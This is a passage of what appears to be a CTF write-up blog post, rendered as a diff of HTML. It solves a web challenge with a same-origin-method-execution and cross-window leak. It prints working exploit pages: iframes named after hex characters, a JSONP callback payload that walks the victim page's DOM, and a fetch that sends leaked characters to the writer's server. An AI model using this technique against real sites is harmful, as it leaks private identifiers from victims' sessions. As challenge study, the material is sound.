+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#5bc4bf">a</span> <span style="color:#06b6ef">id</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">focusme</span> <span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">#</span>&gt;sth&lt;/<span style="color:#5bc4bf">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">const</span> <span style="color:#06b6ef">sleep</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">d</span> =&gt; <span style="color:#815ba4">new</span> Promise(<span style="color:#06b6ef">r</span> =&gt; <span style="color:#06b6ef">setTimeout</span>(<span style="color:#06b6ef">r</span>, <span style="color:#06b6ef">d</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">alphabet</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;0123456789abcdef-&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#776e71">//create iframes
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>        <span style="color:#815ba4">for</span> (<span style="color:#815ba4">var</span> <span style="color:#06b6ef">i</span> <span style="color:#5bc4bf">=</span> <span style="color:#f99b15">0</span>; <span style="color:#06b6ef">i</span> <span style="color:#5bc4bf">&lt;</span> <span style="color:#06b6ef">alphabet</span>.<span style="color:#06b6ef">length</span>; <span style="color:#06b6ef">i</span><span style="color:#5bc4bf">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">iframe</span> <span style="color:#5bc4bf">=</span> document.<span style="color:#06b6ef">createElement</span>(<span style="color:#48b685">&#34;iframe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">iframe</span>.<span style="color:#06b6ef">name</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">alphabet</span>[<span style="color:#06b6ef">i</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">iframe</span>.<span style="color:#06b6ef">src</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;http://localhost:12345/&#34;</span>;
+</span></span><span style="display:flex;"><span>            document.<span style="color:#06b6ef">body</span>.<span style="color:#06b6ef">appendChild</span>(<span style="color:#06b6ef">iframe</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#776e71">//array for found characters
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>        <span style="color:#06b6ef">hovered</span> <span style="color:#5bc4bf">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">const</span> <span style="color:#06b6ef">main</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#776e71">// every 0.075 secs check for iframes&#39; onfucus event
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>            <span style="color:#06b6ef">setInterval</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#06b6ef">p</span> <span style="color:#5bc4bf">=</span> document.<span style="color:#06b6ef">activeElement</span>.<span style="color:#06b6ef">name</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">p</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#776e71">// if there&#39;s focus on an iframe -- add its character to hovered and change the focus
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>                    <span style="color:#06b6ef">hovered</span>.<span style="color:#06b6ef">push</span>(<span style="color:#06b6ef">p</span>);
+</span></span><span style="display:flex;"><span>                    document.<span style="color:#06b6ef">getElementById</span>(<span style="color:#48b685">&#34;focusme&#34;</span>).<span style="color:#06b6ef">focus</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }, <span style="color:#f99b15">75</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">await</span> <span style="color:#06b6ef">sleep</span>(<span style="color:#f99b15">2000</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">c</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">open</span>(<span style="color:#48b685">`/c.html`</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">await</span> <span style="color:#06b6ef">sleep</span>(<span style="color:#f99b15">2000</span> <span style="color:#5bc4bf">+</span> <span style="color:#f99b15">150</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#776e71">// every 500 secs send found characters to our server endpoint /ret/:characters
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>            <span style="color:#06b6ef">setInterval</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#06b6ef">fetch</span>(<span style="color:#48b685">`/ret/</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">hovered</span>.<span style="color:#06b6ef">join</span>(<span style="color:#48b685">&#34;&#34;</span>)<span style="color:#f99b15">}</span><span style="color:#48b685">`</span>)
+</span></span><span style="display:flex;"><span>            }, <span style="color:#f99b15">500</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">main</span>();
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">body</span>&gt;
+</span></span></code></pre></div><p>The third one is just a free document to be replaced with the vulnerable challenge page:</p>
+<p><code>c.html:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">b</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">open</span>(<span style="color:#48b685">`/b.html`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">location</span>.<span style="color:#06b6ef">replace</span>(<span style="color:#48b685">&#34;http://localhost:12345/&#34;</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span></code></pre></div><p>The fourth one contains the main logic. This file opens the page with the post id within the previous <em>(<code>c.html</code>)</em> document. Then that document executes js to leak the homepage&rsquo;s post id char by char.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">const</span> <span style="color:#06b6ef">sleep</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">d</span> =&gt; <span style="color:#815ba4">new</span> Promise(<span style="color:#06b6ef">r</span> =&gt; <span style="color:#06b6ef">setTimeout</span>(<span style="color:#06b6ef">r</span>, <span style="color:#06b6ef">d</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">const</span> <span style="color:#06b6ef">main</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">await</span> <span style="color:#06b6ef">sleep</span>(<span style="color:#f99b15">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#776e71">// 32 is the start of the href url that contains id
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>        <span style="color:#776e71">// 36 is the len of the id
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>        <span style="color:#815ba4">for</span> (<span style="color:#815ba4">var</span> <span style="color:#06b6ef">i</span> <span style="color:#5bc4bf">=</span> <span style="color:#f99b15">32</span>; <span style="color:#06b6ef">i</span> <span style="color:#5bc4bf">&lt;=</span> <span style="color:#f99b15">32</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">36</span><span style="color:#5bc4bf">+</span><span style="color:#f99b15">1</span>; <span style="color:#06b6ef">i</span><span style="color:#5bc4bf">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#776e71">// I&#39;m explainig this payload below
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>            <span style="color:#06b6ef">PAYLOAD</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">`opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">i</span><span style="color:#f99b15">}</span><span style="color:#48b685">]].focus`</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#776e71">// change c.html page&#39;s location to the vulnerable page that executes callback
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>            <span style="color:#06b6ef">opener</span>.<span style="color:#06b6ef">location</span>.<span style="color:#06b6ef">replace</span>(<span style="color:#48b685">`http://localhost:12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">PAYLOAD</span><span style="color:#f99b15">}</span><span style="color:#48b685">%23%00`</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#776e71">// check the next character every 1.5 secs so that the page have 1.5 sec to load.
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>            <span style="color:#815ba4">await</span> <span style="color:#06b6ef">sleep</span>(<span style="color:#f99b15">1500</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">main</span>();
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span></code></pre></div><p>I try to explain the huge <code>PAYLOAD</code> variable here.</p>
+<p>Firstly, <code>opener.opener.document.body.children[1]....href[${i}]</code> traverses through the homepage <code>a.html</code> <em>(<code>a.html</code> is opener.opener of <code>c.html</code>)</em> and finds our <code>&lt;a&gt;</code> tag. Then it takes the i<em>th</em> symbol from its <code>href</code> attribute.</p>
+<p>Secondly, <code>opener[..].focus</code> calls <code>focus()</code> on a character within <code>b.html</code> <em>(opener of <code>c.html</code>)</em> via the callback. Because every character has its own iframe with the <code>name=character</code> attribute <em>(you can access an html tag from js just with its name attribute)</em> <code>b.html</code> page can detect what character caused the <code>onfocus()</code> event.</p>
+<p>Now we have everything to solve the task. I&rsquo;ll host these html pages on my server via php.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>php -S host:port
+</span></span></code></pre></div><p>If we send our url (<code>https://host/a.html</code>) to the bot we can see a part of the id in the logs:</p>
+<p><img src="/images/E8ToEFojmsZu5j_q4dI-WuzmXxeX6zFL" alt="img"></p>
+<p>To get the next part of the id, we need to increase the start number of the href url and send the link to the bot again.</p>
+<p>Using the post id, we can get the flag:</p>
+<p><img src="/images/UNfW-txZSv3nfAUeVSEFZzH_n03EmUND" alt="img"></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/web">web</a></li>
+					
+					<li><a href="/tags/ctf">ctf</a></li>
+					
+					<li><a href="/tags/node">node</a></li>
+					
+					<li><a href="/tags/express">express</a></li>
+					
+					<li><a href="/tags/some">some</a></li>
+					
+					<li><a href="/tags/xsleaks">xsleaks</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/sh1yo" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/sh1yo_/" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2023  © sh1yo |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NTWQD4HQWT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-NTWQD4HQWT', { 'anonymize_ip': false });
+}
+</script>
+<Paste><script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
